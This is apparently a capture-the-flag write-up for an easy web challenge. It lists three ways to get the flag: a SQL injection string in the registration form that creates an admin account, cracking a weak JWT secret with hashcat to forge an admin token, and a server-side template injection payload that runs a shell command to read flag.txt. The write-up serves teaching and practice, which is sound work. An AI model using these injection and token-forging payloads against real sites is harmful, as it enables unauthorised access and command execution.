# Very Vulnerable Site

Author: reyes

> So I think this site is pretty unbreakable. The flag seems to be impossible to obtain to me, but apparently there are multiple possible ways to get the flag? Maybe I'm just dumb...

**Difficulty: Easy**

## Solution

> Choose from 3 ways of solving:

- Register SQLi:  
    `[USERNAME OF CHOICE]', '[PASSWORD HASH OF CHOICE]', 1); -- `

- Crack JWT: Register normally, signin normally, copy JWT from cookie, then  
    `./hashcat -a 0 -m 16500 hash.txt rockyou.txt`  
    Secret is "secret", edit on https://jwt.io/, paste back into cookie, reload /admin.

- SSTI while creating username: 
    `{{"".__class__.__mro__[1].__subclasses__()[468](["type/cat", "flag.txt"],shell=True,stdout=-1).communicate()}}`  
    Many other payloads would work too.
